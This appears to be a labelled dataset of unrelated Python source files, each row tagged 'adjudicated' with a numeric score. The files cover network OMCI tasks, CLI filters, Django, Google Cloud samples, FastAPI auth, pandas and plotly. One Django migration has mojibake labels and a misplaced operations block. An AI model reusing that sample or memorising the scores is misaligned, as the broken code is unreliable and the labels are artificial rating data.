# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import structlog
from voltha.extensions.omci.tasks.get_mds_task import GetMdsTask


class BrcmGetMdsTask(GetMdsTask):
    """"""
    OpenOMCI Get MIB Data Sync value task - Broadcom ONU

    On successful completion, this task will call the 'callback' method of the
    deferred returned by the start method and return the value of the MIB
    Data Sync attribute of the ONT Data ME
    """"""
    name = ""BRCM: Get MDS Task""

    def __init__(self, omci_agent, device_id):
        """"""
        Class initialization

        :param omci_agent: (OmciAdapterAgent) OMCI Adapter agent
        :param device_id: (str) ONU Device ID
        """"""
        self.log = structlog.get_logger(device_id=device_id)
        self.log.debug('function-entry')

        super(BrcmGetMdsTask, self).__init__(omci_agent, device_id)

        self.name = BrcmGetMdsTask.name
        self._device = omci_agent.get_device(device_id)
        self._omci_managed = False      # TODO: Look up capabilities/model number/check handler

    def perform_get_mds(self):
        """"""
        Get the 'mib_data_sync' attribute of the ONU
        """"""
        self.log.debug('function-entry')
        self.log.info('perform-get-mds')

        if self._omci_managed:
            return super(BrcmGetMdsTask, self).perform_get_mds()

        # Non-OMCI managed BRCM ONUs always return 0 for MDS, use the MIB
        # sync value and depend on an accelerated mib resync to do the
        # proper comparison

        self.deferred.callback(self._device.mib_synchronizer.mib_data_sync)
"
212	adjudicated	2	"""""""
For backwards-compatibility. keep this file.
(Many people are going to have key bindings that rely on this file.)
""""""
from .app import *

__all__ = [
    # Old names.
    ""HasArg"",
    ""HasCompletions"",
    ""HasFocus"",
    ""HasSelection"",
    ""HasValidationError"",
    ""IsDone"",
    ""IsReadOnly"",
    ""IsMultiline"",
    ""RendererHeightIsKnown"",
    ""InEditingMode"",
    ""InPasteMode"",
    ""ViMode"",
    ""ViNavigationMode"",
    ""ViInsertMode"",
    ""ViInsertMultipleMode"",
    ""ViReplaceMode"",
    ""ViSelectionMode"",
    ""ViWaitingForTextObjectMode"",
    ""ViDigraphMode"",
    ""EmacsMode"",
    ""EmacsInsertMode"",
    ""EmacsSelectionMode"",
    ""IsSearching"",
    ""HasSearch"",
    ""ControlIsSearchable"",
]

# Keep the original classnames for backwards compatibility.
HasValidationError = lambda: has_validation_error
HasArg = lambda: has_arg
IsDone = lambda: is_done
RendererHeightIsKnown = lambda: renderer_height_is_known
ViNavigationMode = lambda: vi_navigation_mode
InPasteMode = lambda: in_paste_mode
EmacsMode = lambda: emacs_mode
EmacsInsertMode = lambda: emacs_insert_mode
ViMode = lambda: vi_mode
IsSearching = lambda: is_searching
HasSearch = lambda: is_searching
ControlIsSearchable = lambda: control_is_searchable
EmacsSelectionMode = lambda: emacs_selection_mode
ViDigraphMode = lambda: vi_digraph_mode
ViWaitingForTextObjectMode = lambda: vi_waiting_for_text_object_mode
ViSelectionMode = lambda: vi_selection_mode
ViReplaceMode = lambda: vi_replace_mode
ViInsertMultipleMode = lambda: vi_insert_multiple_mode
ViInsertMode = lambda: vi_insert_mode
HasSelection = lambda: has_selection
HasCompletions = lambda: has_completions
IsReadOnly = lambda: is_read_only
IsMultiline = lambda: is_multiline

HasFocus = has_focus  # No lambda here! (Has_focus is callable that returns a callable.)
InEditingMode = in_editing_mode"
352	adjudicated	0	"from time import time

from bot import DOWNLOAD_DIR, LOGGER
from bot.helper.ext_utils.bot_utils import get_readable_file_size, MirrorStatus, EngineStatus, get_readable_time
from bot.helper.ext_utils.fs_utils import get_path_size

class ZipStatus:
    def __init__(self, name, size, gid, listener):
        self.__name = name
        self.__size = size
        self.__gid = gid
        self.__listener = listener
        self.__uid = listener.uid
        self.__start_time = time()
        self.message = listener.message

    def gid(self):
        return self.__gid

    def speed_raw(self):
        return self.processed_bytes() / (time() - self.__start_time)

    def progress_raw(self):
        try:
            return self.processed_bytes() / self.__size * 100
        except:
            return 0

    def progress(self):
        return f'{round(self.progress_raw(), 2)}%'

    def speed(self):
        return f'{get_readable_file_size(self.speed_raw())}/s'

    def name(self):
        return self.__name

    def size_raw(self):
        return self.__size

    def size(self):
        return get_readable_file_size(self.__size)

    def eta(self):
        try:
            seconds = (self.size_raw() - self.processed_bytes()) / self.speed_raw()
            return f'{get_readable_time(seconds)}'
        except:
            return '-'

    def status(self):
        return MirrorStatus.STATUS_ARCHIVING

    def processed_bytes(self):
        if self.__listener.newDir:
            return get_path_size(f""{DOWNLOAD_DIR}{self.__uid}10000"")
        else:
            return get_path_size(f""{DOWNLOAD_DIR}{self.__uid}"") - self.__size

    def download(self):
        return self

    def cancel_download(self):
        LOGGER.info(f'Cancelling Archive: {self.__name}')
        if self.__listener.suproc is not None:
            self.__listener.suproc.kill()
        self.__listener.onUploadError('archiving stopped by user!')

    def eng(self):
        return EngineStatus.STATUS_ZIP"
243	adjudicated	0	"# Generated by Django 3.2.16 on 2023-02-10 16:24

from django.db import migrations, models
from django.template.backends import django


class Migration(migrations.Migration):

    initial = True

    dependencies = [
    ]


operations = [
        migrations.CreateModel(
            name='Category',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('name', models.CharField(db_index=True, max_length=100, verbose_name='ÐÐ°ÑÐµÐ³Ð¾ÑÐ¸Ñ')),
                ('slug', models.SlugField(max_length=255, unique=True, verbose_name='URL')),
            ],
            options={
                'verbose_name': 'ÐÐ°ÑÐµÐ³Ð¾ÑÐ¸Ñ',
                'verbose_name_plural': 'ÐÐ°ÑÐµÐ³Ð¾ÑÐ¸Ð¸',
                'ordering': ['id'],
            },
        ),
        migrations.CreateModel(
            name='Food',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('title', models.CharField(max_length=255, verbose_name='ÐÐ°Ð³Ð¾Ð»Ð¾Ð²Ð¾Ðº')),
                ('slug', models.SlugField(max_length=255, unique=True, verbose_name='URL')),
                ('content', models.TextField(blank=True, verbose_name='Ð¢ÐµÐºÑÑ ÑÑÐ°ÑÑÐ¸')),
                ('photo', models.ImageField(upload_to='photos/%Y/%m/%d/', verbose_name='Ð¤Ð¾ÑÐ¾')),
                ('time_create', models.DateTimeField(auto_now_add=True, verbose_name='ÐÑÐµÐ¼Ñ ÑÐ¾Ð·Ð´Ð°Ð½Ð¸Ñ')),
                ('time_update', models.DateTimeField(auto_now=True, verbose_name='ÐÑÐµÐ¼Ñ Ð¸Ð·Ð¼ÐµÐ½ÐµÐ½Ð¸Ñ')),
                ('is_published', models.BooleanField(default=True, verbose_name='ÐÑÐ±Ð»Ð¸ÐºÐ°ÑÐ¸Ñ')),
                ('cat', models.ForeignKey(on_delete=django.db.models.deletion.PROTECT, to='food.category', verbose_name='ÐÐ°ÑÐµÐ³Ð¾ÑÐ¸Ð¸')),
            ],
            options={
                'verbose_name': 'ÐÐ·Ð²ÐµÑÑÐ½ÑÐµ ,Ð±Ð»ÑÐ´Ð°',
                'verbose_name_plural': 'ÐÐ·Ð²ÐµÑÑÐ½ÑÐµ Ð±Ð»ÑÐ´Ð°',
                'ordering': ['-time_create', 'title'],
            },
        ),
    ]"
92	adjudicated	2	"# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START gae_python38_cloudsql_psql_pooling]
# [START gae_python3_cloudsql_psql_pooling]
import os

from flask import Flask
import psycopg2.pool

db_user = os.environ.get('CLOUD_SQL_USERNAME')
db_password = os.environ.get('CLOUD_SQL_PASSWORD')
db_name = os.environ.get('CLOUD_SQL_DATABASE_NAME')
db_connection_name = os.environ.get('CLOUD_SQL_CONNECTION_NAME')

# When deployed to App Engine, the `GAE_ENV` environment variable will be
# set to `standard`
if os.environ.get('GAE_ENV') == 'standard':
    # If deployed, use the local socket interface for accessing Cloud SQL
    host = '/cloudsql/{}'.format(db_connection_name)
else:
    # If running locally, use the TCP connections instead
    # Set up Cloud SQL Proxy (cloud.google.com/sql/docs/mysql/sql-proxy)
    # so that your application can use 127.0.0.1:3306 to connect to your
    # Cloud SQL instance
    host = '127.0.0.1'

db_config = {
    'user': db_user,
    'password': db_password,
    'database': db_name,
    'host': host
}

cnxpool = psycopg2.pool.ThreadedConnectionPool(minconn=1, maxconn=3,
                                               **db_config)

app = Flask(__name__)


@app.route('/')
def main():
    cnx = cnxpool.getconn()
    with cnx.cursor() as cursor:
        cursor.execute('SELECT NOW() as now;')
        result = cursor.fetchall()
    current_time = result[0][0]
    cnx.commit()
    cnxpool.putconn(cnx)

    return str(current_time)
# [END gae_python3_cloudsql_psql_pooling]
# [END gae_python38_cloudsql_psql_pooling]


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080, debug=True)"
303	adjudicated	4	"#  Copyright 2022 Google LLC
#
#  Licensed under the Apache License, Version 2.0 (the ""License"");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an ""AS IS"" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.


# This is an ingredient file. It is not meant to be run directly. Check the samples/snippets
# folder for complete code samples that are ready to be used.
# Disabling flake8 for the ingredients file, as it would fail F821 - undefined name check.
# flake8: noqa
from google.cloud import compute_v1


# <INGREDIENT set_deprecation_status>
def set_deprecation_status(project_id: str, image_name: str, status: compute_v1.DeprecationStatus.State) -> None:
    """"""
    Modify the deprecation status of an image.

    Note: Image objects by default don't have the `deprecated` attribute at all unless it's set.

    Args:
        project_id: project ID or project number of the Cloud project that hosts the image.
        image_name: name of the image you want to modify
        status: the status you want to set for the image. Available values are available in
            `compute_v1.DeprecationStatus.State` enum. Learn more about image deprecation statuses:
            https://cloud.google.com/compute/docs/images/create-delete-deprecate-private-images#deprecation-states
    """"""
    image_client = compute_v1.ImagesClient()
    deprecation_status = compute_v1.DeprecationStatus()
    deprecation_status.state = status.name
    operation = image_client.deprecate(project=project_id, image=image_name,
                                       deprecation_status_resource=deprecation_status)

    wait_for_extended_operation(operation, ""changing deprecation state of an image"")
# </INGREDIENT>"
4	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

import jmespath
import pytest

from tests.charts.helm_template_generator import render_chart


class TestPodLauncher:
    @pytest.mark.parametrize(
        ""executor, rbac, allow, expected_accounts"",
        [
            (""CeleryKubernetesExecutor"", True, True, [""scheduler"", ""worker""]),
            (""KubernetesExecutor"", True, True, [""scheduler"", ""worker""]),
            (""CeleryExecutor"", True, True, [""worker""]),
            (""LocalExecutor"", True, True, [""scheduler""]),
            (""LocalExecutor"", False, False, []),
        ],
    )
    def test_pod_launcher_role(self, executor, rbac, allow, expected_accounts):
        docs = render_chart(
            values={
                ""rbac"": {""create"": rbac},
                ""allowPodLaunching"": allow,
                ""executor"": executor,
            },
            show_only=[""templates/rbac/pod-launcher-rolebinding.yaml""],
        )
        if expected_accounts:
            for idx, suffix in enumerate(expected_accounts):
                assert f""release-name-airflow-{suffix}"" == jmespath.search(f""subjects[{idx}].name"", docs[0])
        else:
            assert [] == docs"
395	adjudicated	0	"# -*- coding: utf-8 -*-
# Copyright (C) 2006-2007 SÃ¸ren Roug, European Environment Agency
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
#
# Contributor(s):
#

from odf.namespaces import ANIMNS
from odf.element import Element


# Autogenerated
def Animate(**args):
    return Element(qname = (ANIMNS,'animate'), **args)

def Animatecolor(**args):
    return Element(qname = (ANIMNS,'animateColor'), **args)

def Animatemotion(**args):
    return Element(qname = (ANIMNS,'animateMotion'), **args)

def Animatetransform(**args):
    return Element(qname = (ANIMNS,'animateTransform'), **args)

def Audio(**args):
    return Element(qname = (ANIMNS,'audio'), **args)

def Command(**args):
    return Element(qname = (ANIMNS,'command'), **args)

def Iterate(**args):
    return Element(qname = (ANIMNS,'iterate'), **args)

def Par(**args):
    return Element(qname = (ANIMNS,'par'), **args)

def Param(**args):
    return Element(qname = (ANIMNS,'param'), **args)

def Seq(**args):
    return Element(qname = (ANIMNS,'seq'), **args)

def Set(**args):
    return Element(qname = (ANIMNS,'set'), **args)

def Transitionfilter(**args):
    return Element(qname = (ANIMNS,'transitionFilter'), **args)
"
144	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .charsetgroupprober import CharSetGroupProber
from .utf8prober import UTF8Prober
from .sjisprober import SJISProber
from .eucjpprober import EUCJPProber
from .gb2312prober import GB2312Prober
from .euckrprober import EUCKRProber
from .cp949prober import CP949Prober
from .big5prober import Big5Prober
from .euctwprober import EUCTWProber


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter=None):
        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber(),
        ]
        self.reset()"
55	adjudicated	2	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""funnel"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
115	adjudicated	1	"from fastapi import APIRouter, Depends, HTTPException
from fastapi.security import OAuth2PasswordRequestForm
from starlette import status

from app.repository.users_repository import UsersRepository
from app.repository.unit_of_work import UnitOfWork
from app.users_service.users_service import UsersService
from app.users_service.users import User
from app.web.api.schemas import UserRegisterInSchema, UserOutSchema, Token
from app.web.api.auth import authenticate_user, issue_new_token, get_current_user

router = APIRouter(tags=[""auth""])


@router.post(
    ""/register"", status_code=status.HTTP_201_CREATED, response_model=UserOutSchema
)
async def register(payload: UserRegisterInSchema):
    with UnitOfWork() as unit_of_work:
        repo = UsersRepository(unit_of_work.session)
        users_service = UsersService(repo)
        # user ID didn't exist before commit
        # we have to get it now when the SQLAlchemy session is still active.
        user_data = payload.dict()
        del user_data[""password_confirm""]
        user = users_service.add_user(**user_data)
        unit_of_work.commit()
        res = user.dict()
    return res


@router.post(""/token"", response_model=Token)
async def login_for_access_token(form_data: OAuth2PasswordRequestForm = Depends()):
    user = authenticate_user(form_data.username, form_data.password)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=""Incorrect username or password"",
            headers={""WWW-Authenticate"": ""Bearer""},
        )
    token = issue_new_token(user)
    return token


@router.get(""/current_user"", response_model=UserOutSchema)
async def get_current_user(current_user: User = Depends(get_current_user)):
    return current_user.dict()"
284	adjudicated	2	"""""""
 The GeometryColumns and SpatialRefSys models for the PostGIS backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class PostGISGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' view from PostGIS. See the PostGIS
    documentation at Ch. 4.3.2.
    """"""
    f_table_catalog = models.CharField(max_length=256)
    f_table_schema = models.CharField(max_length=256)
    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    type = models.CharField(max_length=30)

    class Meta:
        app_label = 'gis'
        db_table = 'geometry_columns'
        managed = False

    def __str__(self):
        return '%s.%s - %dD %s field (SRID: %d)' % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return 'f_table_name'

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return 'f_geometry_column'


class PostGISSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from PostGIS. See the PostGIS
    documentation at Ch. 4.2.1.
    """"""
    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    srtext = models.CharField(max_length=2048)
    proj4text = models.CharField(max_length=2048)

    class Meta:
        app_label = 'gis'
        db_table = 'spatial_ref_sys'
        managed = False

    @property
    def wkt(self):
        return self.srtext"
337	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .charsetgroupprober import CharSetGroupProber
from .utf8prober import UTF8Prober
from .sjisprober import SJISProber
from .eucjpprober import EUCJPProber
from .gb2312prober import GB2312Prober
from .euckrprober import EUCKRProber
from .cp949prober import CP949Prober
from .big5prober import Big5Prober
from .euctwprober import EUCTWProber


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter=None):
        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber()
        ]
        self.reset()"
277	adjudicated	4	"from __future__ import annotations

import numpy as np

from pandas._typing import NumpyIndexT

from pandas.core.dtypes.common import is_list_like


def cartesian_product(X) -> list[np.ndarray]:
    """"""
    Numpy version of itertools.product.
    Sometimes faster (for large inputs)...

    Parameters
    ----------
    X : list-like of list-likes

    Returns
    -------
    product : list of ndarrays

    Examples
    --------
    >>> cartesian_product([list('ABC'), [1, 2]])
    [array(['A', 'A', 'B', 'B', 'C', 'C'], dtype='<U1'), array([1, 2, 1, 2, 1, 2])]

    See Also
    --------
    itertools.product : Cartesian product of input iterables.  Equivalent to
        nested for-loops.
    """"""
    msg = ""Input must be a list-like of list-likes""
    if not is_list_like(X):
        raise TypeError(msg)
    for x in X:
        if not is_list_like(x):
            raise TypeError(msg)

    if len(X) == 0:
        return []

    lenX = np.fromiter((len(x) for x in X), dtype=np.intp)
    cumprodX = np.cumproduct(lenX)

    if np.any(cumprodX < 0):
        raise ValueError(""Product space too large to allocate arrays!"")

    a = np.roll(cumprodX, 1)
    a[0] = 1

    if cumprodX[-1] != 0:
        b = cumprodX[-1] / cumprodX
    else:
        # if any factor is empty, the cartesian product is empty
        b = np.zeros_like(cumprodX)

    # error: Argument of type ""int_"" cannot be assigned to parameter ""num"" of
    # type ""int"" in function ""tile_compat""
    return [
        tile_compat(
            np.repeat(x, b[i]),
            np.product(a[i]),  # pyright: ignore[reportGeneralTypeIssues]
        )
        for i, x in enumerate(X)
    ]


def tile_compat(arr: NumpyIndexT, num: int) -> NumpyIndexT:
    """"""
    Index compat for np.tile.

    Notes
    -----
    Does not support multi-dimensional `num`.
    """"""
    if isinstance(arr, np.ndarray):
        return np.tile(arr, num)

    # Otherwise we have an Index
    taker = np.tile(np.arange(len(arr)), num)
    return arr.take(taker)"
366	adjudicated	3	"from six import string_types

from .base import GraphQLDocument

# Necessary for static type checking
if False:  # flake8: noqa
    from ..type.schema import GraphQLSchema
    from typing import Any, Optional, Dict, Callable, Union


class GraphQLCompiledDocument(GraphQLDocument):
    @classmethod
    def from_code(
        cls,
        schema,  # type: GraphQLSchema
        code,  # type: Union[str, Any]
        uptodate=None,  # type: Optional[bool]
        extra_namespace=None,  # type: Optional[Dict[str, Any]]
    ):
        # type: (...) -> GraphQLCompiledDocument
        """"""Creates a GraphQLDocument object from compiled code and the globals.  This
        is used by the loaders and schema to create a document object.
        """"""
        if isinstance(code, string_types):
            filename = ""<document>""
            code = compile(code, filename, ""exec"")
        namespace = {""__file__"": code.co_filename}
        exec(code, namespace)
        if extra_namespace:
            namespace.update(extra_namespace)
        rv = cls._from_namespace(schema, namespace)
        # rv._uptodate = uptodate
        return rv

    @classmethod
    def from_module_dict(cls, schema, module_dict):
        # type: (GraphQLSchema, Dict[str, Any]) -> GraphQLCompiledDocument
        """"""Creates a template object from a module.  This is used by the
        module loader to create a document object.
        """"""
        return cls._from_namespace(schema, module_dict)

    @classmethod
    def _from_namespace(cls, schema, namespace):
        # type: (GraphQLSchema, Dict[str, Any]) -> GraphQLCompiledDocument
        document_string = namespace.get(""document_string"", """")  # type: str
        document_ast = namespace.get(""document_ast"")  # type: ignore
        execute = namespace[""execute""]  # type: Callable

        namespace[""schema""] = schema
        return cls(
            schema=schema,
            document_string=document_string,
            document_ast=document_ast,  # type: ignore
            execute=execute,
        )"
226	adjudicated	2	"# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

import contextlib
from typing import Dict, Optional, Type

from pylint.testutils.global_test_linter import linter
from pylint.testutils.unittest_linter import UnittestLinter
from pylint.utils import ASTWalker


class CheckerTestCase:
    """"""A base testcase class for unit testing individual checker classes.""""""

    CHECKER_CLASS: Optional[Type] = None
    CONFIG: Dict = {}

    def setup_method(self):
        self.linter = UnittestLinter()
        self.checker = self.CHECKER_CLASS(self.linter)  # pylint: disable=not-callable
        for key, value in self.CONFIG.items():
            setattr(self.checker.config, key, value)
        self.checker.open()

    @contextlib.contextmanager
    def assertNoMessages(self):
        """"""Assert that no messages are added by the given method.""""""
        with self.assertAddsMessages():
            yield

    @contextlib.contextmanager
    def assertAddsMessages(self, *messages):
        """"""Assert that exactly the given method adds the given messages.

        The list of messages must exactly match *all* the messages added by the
        method. Additionally, we check to see whether the args in each message can
        actually be substituted into the message string.
        """"""
        yield
        got = self.linter.release_messages()
        no_msg = ""No message.""
        expected = ""\n"".join(repr(m) for m in messages) or no_msg
        got_str = ""\n"".join(repr(m) for m in got) or no_msg
        msg = (
            ""Expected messages did not match actual.\n""
            f""\nExpected:\n{expected}\n\nGot:\n{got_str}\n""
        )
        assert got == list(messages), msg

    def walk(self, node):
        """"""recursive walk on the given node""""""
        walker = ASTWalker(linter)
        walker.add_checker(self.checker)
        walker.walk(node)"
428	adjudicated	1	"# Copyright 2017-present Open Networking Foundation
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import structlog
from enum import Enum
from google.protobuf.json_format import MessageToDict
from google.protobuf.message import Message
from simplejson import dumps

from common.event_bus import EventBusClient
from voltha.core.config.config_proxy import CallbackType
from voltha.protos import third_party
from voltha.protos.events_pb2 import ConfigEvent, ConfigEventType

IGNORED_CALLBACKS = [CallbackType.PRE_ADD, CallbackType.GET,
                     CallbackType.POST_LISTCHANGE, CallbackType.PRE_REMOVE,
                     CallbackType.PRE_UPDATE]

log = structlog.get_logger()

class ConfigEventBus(object):

    __slots__ = (
        '_event_bus_client',  # The event bus client used to publish events.
        '_topic'  # the topic to publish to
    )

    def __init__(self):
        self._event_bus_client = EventBusClient()
        self._topic = 'model-change-events'

    def advertise(self, type, data, hash=None):
        if type in IGNORED_CALLBACKS:
            log.info('Ignoring event {} with data {}'.format(type, data))
            return

        if type is CallbackType.POST_ADD:
            kind = ConfigEventType.add
        elif type is CallbackType.POST_REMOVE:
            kind = ConfigEventType.remove
        else:
            kind = ConfigEventType.update

        if isinstance(data, Message):
            msg = dumps(MessageToDict(data, True, True))
        else:
            msg = data

        event = ConfigEvent(
            type=kind,
            hash=hash,
            data=msg
        )

        self._event_bus_client.publish(self._topic, event)
"
479	adjudicated	3	"# A demo for the IDsObjectPicker interface.
import win32clipboard
import pythoncom
from win32com.adsi import adsi
from win32com.adsi.adsicon import *

cf_objectpicker = win32clipboard.RegisterClipboardFormat(CFSTR_DSOP_DS_SELECTION_LIST)


def main():
    hwnd = 0

    # Create an instance of the object picker.
    picker = pythoncom.CoCreateInstance(
        adsi.CLSID_DsObjectPicker,
        None,
        pythoncom.CLSCTX_INPROC_SERVER,
        adsi.IID_IDsObjectPicker,
    )

    # Create our scope init info.
    siis = adsi.DSOP_SCOPE_INIT_INFOs(1)
    sii = siis[0]

    # Combine multiple scope types in a single array entry.

    sii.type = (
        DSOP_SCOPE_TYPE_UPLEVEL_JOINED_DOMAIN | DSOP_SCOPE_TYPE_DOWNLEVEL_JOINED_DOMAIN
    )

    # Set uplevel and downlevel filters to include only computer objects.
    # Uplevel filters apply to both mixed and native modes.
    # Notice that the uplevel and downlevel flags are different.

    sii.filterFlags.uplevel.bothModes = DSOP_FILTER_COMPUTERS
    sii.filterFlags.downlevel = DSOP_DOWNLEVEL_FILTER_COMPUTERS

    # Initialize the interface.
    picker.Initialize(
        None,  # Target is the local computer.
        siis,  # scope infos
        DSOP_FLAG_MULTISELECT,  # options
        (""objectGUID"", ""displayName""),
    )  # attributes to fetch

    do = picker.InvokeDialog(hwnd)
    # Extract the data from the IDataObject.
    format_etc = (
        cf_objectpicker,
        None,
        pythoncom.DVASPECT_CONTENT,
        -1,
        pythoncom.TYMED_HGLOBAL,
    )
    medium = do.GetData(format_etc)
    data = adsi.StringAsDS_SELECTION_LIST(medium.data)
    for item in data:
        name, klass, adspath, upn, attrs, flags = item
        print(""Item"", name)
        print("" Class:"", klass)
        print("" AdsPath:"", adspath)
        print("" UPN:"", upn)
        print("" Attrs:"", attrs)
        print("" Flags:"", flags)


if __name__ == ""__main__"":
    main()"
469	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""hoverlabel"", parent_name=""choroplethmapbox"", **kwargs
    ):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
